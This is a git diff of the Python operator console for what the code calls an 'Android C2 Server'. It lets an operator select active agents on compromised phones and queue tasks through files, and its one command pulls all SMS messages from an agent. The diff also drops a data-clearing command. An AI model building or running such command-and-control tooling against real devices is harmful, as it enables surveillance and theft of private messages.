@@ -1,10 +1,7 @@
 from cmd import Cmd
-import main
 import shutil
 import os
-
-def changeInteractedAgent(agent):
-    main.interacted_agent = agent
+import main
 
 class Terminal(Cmd):
     intro = "Android C2 Server\nType help or ? to list commands\n"
@@ -32,17 +29,12 @@ class Terminal(Cmd):
             # Call agent commandline
             agent = main.active_agents[number-1]
             print(f"[+] Interacting with {agent}")
-            changeInteractedAgent(agent)
+            main.interacted_agent = agent
             agentInteraction = Agent_Terminal()
             agentInteraction.prompt = f"({agent})> "
             agentInteraction.cmdloop()
         else:
             print(f"[-] Unable to find agent: {agent}")
-    
-    def do_clear(self, arg):
-        "Clears the data directory"
-        shutil.rmtree('data/')
-        os.makedirs("data")
 
 
     def do_exit(self, arg):
@@ -70,4 +62,16 @@ class Agent_Terminal(Cmd):
     # Agent commands here
     def do_sms(self, args):
         "Retrieves all SMS from agent"
-        main.agent_command[main.interacted_agent] = "sms"
+        self.addTask("sms")
+
+    def addTask(self, task):
+        with open(f"task/{main.interacted_agent}", "w") as f:
+            f.write(task) 
+
+    def do_exit(self, arg):
+        "Exits the prompt"
+        return True
+
+if __name__ == "__main__":
+    terminal = Terminal()
+    terminal.cmdloop()
